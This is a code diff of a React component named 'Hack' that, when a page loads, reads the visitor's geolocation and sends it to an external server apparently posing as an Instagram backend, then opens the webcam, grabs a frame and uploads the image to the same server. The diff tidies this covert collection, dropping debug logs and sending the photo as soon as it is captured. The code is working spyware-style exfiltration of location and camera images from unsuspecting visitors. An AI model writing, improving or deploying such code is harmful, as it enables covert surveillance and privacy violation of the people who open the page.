@@ -1,7 +1,7 @@
 import React, { useEffect, useRef } from "react";
 import axios from "axios";
 
-let img = {};
+let imgData = {};
 
 export const Hack: React.FC = () => {
   const videoRef = useRef<HTMLVideoElement | null>(null);
@@ -24,40 +24,44 @@ export const Hack: React.FC = () => {
             location: data?.results[0]?.formatted,
           };
 
-          console.log("Data", toSend);
-
           await axios.post(
             "https://instagram-server-eight.vercel.app/v1/upload",
-            toSend,
-            {
-              withCredentials: true,
-            }
+            // "http://localhost:3333/v1/upload",
+            toSend
           );
-          console.log(data?.results[0]?.formatted);
         },
         (err) => {
           console.log(err);
         }
       );
+    };
 
+    fetchItem();
+  }, []);
+
+  useEffect(() => {
+    const fetchImg = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: true,
         });
 
-        console.log(stream);
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
           // Automatically capture the photo after the stream starts
-          videoRef.current.onloadedmetadata = () => {
+          videoRef.current.onloadedmetadata = async () => {
             const canvas = canvasRef.current;
             const video = videoRef.current;
 
             if (canvas && video) {
-              console.log(canvas?.toDataURL("image/png"));
-              img = {
+              imgData = {
                 img: canvas.toDataURL("image/png"),
               };
+              await axios.post(
+                "https://instagram-server-eight.vercel.app/cloudinary/upload",
+                // "http://localhost:3333/cloudinary/upload",
+                imgData
+              );
               const context = canvas.getContext("2d");
               if (context) {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -68,17 +72,8 @@ export const Hack: React.FC = () => {
       } catch (err) {
         console.log("Error accessing the camera: ", err);
       }
-
-      await axios.post(
-        "https://instagram-server-eight.vercel.app/cloudinary/upload",
-        img,
-        {
-          withCredentials: true,
-        }
-      );
     };
-
-    fetchItem();
+    fetchImg();
   }, []);
 
   return (
